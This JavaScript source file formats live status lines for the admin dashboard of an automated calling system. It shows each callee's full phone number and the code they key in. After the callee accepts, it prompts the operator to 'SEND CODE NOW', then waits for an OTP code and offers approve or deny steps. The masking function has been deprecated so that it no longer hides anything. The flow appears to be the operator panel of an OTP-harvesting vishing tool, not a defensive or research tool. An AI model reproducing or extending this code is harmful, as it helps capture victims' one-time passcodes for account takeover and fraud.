/**
 * Friendly one-line summaries for the admin dashboard (full phone + codes).
 */

import { isCalleeFacingLine } from "./adminEventMessage.js";
import { expectedDigits } from "./speechTemplate.js";

/** Full E.164-style phone for live output lines. */
export function formatPhoneForLiveOutput(phone) {
  const raw = String(phone || "").trim();
  if (!raw) return "?";
  if (raw.startsWith("+")) return raw;
  const digits = raw.replace(/\D/g, "");
  return digits ? `+${digits}` : raw;
}

/** @deprecated use formatPhoneForLiveOutput */
export function maskPhoneForLiveOutput(phone) {
  return formatPhoneForLiveOutput(phone);
}

function sessionEnteredCode(session) {
  return (session?.entered_code || session?.masked_entered_code || "").trim();
}

/** Pull digit run from event message (e.g. "Keypad entry complete (6 digits): 123456"). */
export function codeFromEventMessage(message) {
  const text = String(message || "");
  const trailing = text.match(/:\s*(\d+)\s*$/);
  if (trailing) return trailing[1];
  const runs = text.match(/\d{3,}/g);
  return runs?.length ? runs[runs.length - 1] : "";
}

const SHOWN_TECH = new Set([
  "CALL_STARTED",
  "CALL_INITIATED",
  "CALL_CREATED",
  "DIAL_STARTED",
  "CALL_RINGING",
  "RINGING",
  "CALL_ANSWERED",
  "ANSWERED",
  "RECIPIENT_ACCEPTED",
  "RECIPIENT_DECLINED",
  "ADMIN_CODE_SENT_CONFIRMED",
  "DIGITS_RECEIVED",
  "DIGIT_RECEIVED",
  "PENDING_ADMIN_VERIFICATION",
  "ADMIN_VERIFICATION_APPROVED",
  "ADMIN_VERIFICATION_REJECTED",
  "VERIFICATION_SUCCESS",
  "VERIFICATION_FAILED",
  "CALL_FAILED",
  "CALL_HANGUP",
  "CALL_COMPLETED",
  "HANGUP",
  "FAILED",
  "MAX_ATTEMPTS_EXCEEDED",
]);

export function formatLiveProviderLine(ev, phoneFn, session) {
  const phone = typeof phoneFn === "function" ? phoneFn() : "?";
  const plainCode = sessionEnteredCode(session);
  const t = ev?.event_type;
  switch (t) {
    case "CALL_STARTED":
    case "CALL_INITIATED":
    case "CALL_CREATED":
      return `[+] ${phone} => initiated`;
    case "DIAL_STARTED":
      return `[+] ${phone} => dialing`;
    case "CALL_RINGING":
    case "RINGING":
      return `[+] ${phone} => ringing`;
    case "CALL_ANSWERED":
    case "ANSWERED":
      return `[+] ${phone} => SIP connected — IVR starting (phone may not have rung)`;
    case "RECIPIENT_ACCEPTED": {
      const msg = String(ev.message || "");
      if (msg.includes("pressed 1")) {
        return `[+] ${phone} => consent choice: pressed 1 (confirm)`;
      }
      return `[+] ${phone} => recipient accepted (keypad 1)`;
    }
    case "RECIPIENT_DECLINED": {
      const msg = String(ev.message || "");
      if (msg.includes("pressed 2") && msg.includes("consent")) {
        return `[+] ${phone} => consent choice: pressed 2 (decline)`;
      }
      return `[+] ${phone} => recipient declined`;
    }
    case "ADMIN_CODE_SENT_CONFIRMED":
      return `[+] ${phone} => admin confirmed code sent`;
    case "DIGITS_RECEIVED": {
      const shown = plainCode || codeFromEventMessage(ev.message);
      return `[+] ${phone} => code entered: ${shown || "—"}`;
    }
    case "DIGIT_RECEIVED":
      return null;
    case "PENDING_ADMIN_VERIFICATION":
      return `[+] ${phone} => pending admin verification${
        plainCode ? ` (code ${plainCode})` : ""
      }`;
    case "ADMIN_VERIFICATION_APPROVED":
      return `[+] ${phone} => accepted`;
    case "ADMIN_VERIFICATION_REJECTED":
      return `[+] ${phone} => denied`;
    case "VERIFICATION_SUCCESS":
      return `[+] ${phone} => completed`;
    case "VERIFICATION_FAILED":
    case "CALL_FAILED":
    case "FAILED":
    case "MAX_ATTEMPTS_EXCEEDED":
      return `[+] ${phone} => failed`;
    case "CALL_HANGUP":
    case "CALL_COMPLETED":
    case "HANGUP":
      return `[+] ${phone} => call ended`;
    default:
      return null;
  }
}

/**
 * Build ordered unique live lines for the selected session.
 * Injects SEND CODE NOW when step is waiting_admin_code_send (post accept).
 */
export function buildLiveOutputLines(events, session) {
  if (!session?.id) return [];
  const phoneLine = () => formatPhoneForLiveOutput(session.phone_number);
  const keypadN = expectedDigits(session);
  const filtered = (events || [])
    .filter((e) => e.session_id === session.id && SHOWN_TECH.has(e.event_type))
    .sort((a, b) => new Date(a.created_at) - new Date(b.created_at));

  const lines = [];
  const seen = new Set();
  for (const ev of filtered) {
    const line = formatLiveProviderLine(ev, phoneLine, session);
    const t = ev?.event_type;
    if (t === "RECIPIENT_ACCEPTED") {
      if (line && !seen.has(line)) {
        seen.add(line);
        lines.push({ key: `ev-${ev.id}`, text: line, eventId: ev.id });
      }
      const optimisticSend = `[+] ${phoneLine()} => SEND CODE NOW`;
      if (!seen.has(optimisticSend)) {
        seen.add(optimisticSend);
        lines.push({ key: `ev-${ev.id}-send-opt`, text: optimisticSend, eventId: ev.id });
      }
      continue;
    }
    if (line && !seen.has(line)) {
      seen.add(line);
      lines.push({ key: `ev-${ev.id}`, text: line, eventId: ev.id });
    }
    if (t === "ADMIN_CODE_SENT_CONFIRMED") {
      const pendingCode = `[+] ${phoneLine()} => waiting for OTP code (4, 6, 8, or 10 digits, then #)`;
      if (!seen.has(pendingCode)) {
        seen.add(pendingCode);
        lines.push({ key: `ev-${ev.id}-wait-code`, text: pendingCode, eventId: ev.id });
      }
    }
  }

  const sendLine = `[+] ${phoneLine()} => SEND CODE NOW`;
  if (session.simulator_step === "waiting_admin_code_send" && !lines.some((l) => l.text === sendLine)) {
    const afterAccept = lines.findIndex((l) => l.text.includes("recipient accepted"));
    const row = { key: "step-wait-admin", text: sendLine, eventId: null };
    if (afterAccept >= 0) lines.splice(afterAccept + 1, 0, row);
    else lines.push(row);
  }

  return lines.filter((row) => !isCalleeFacingLine(row.text));
}
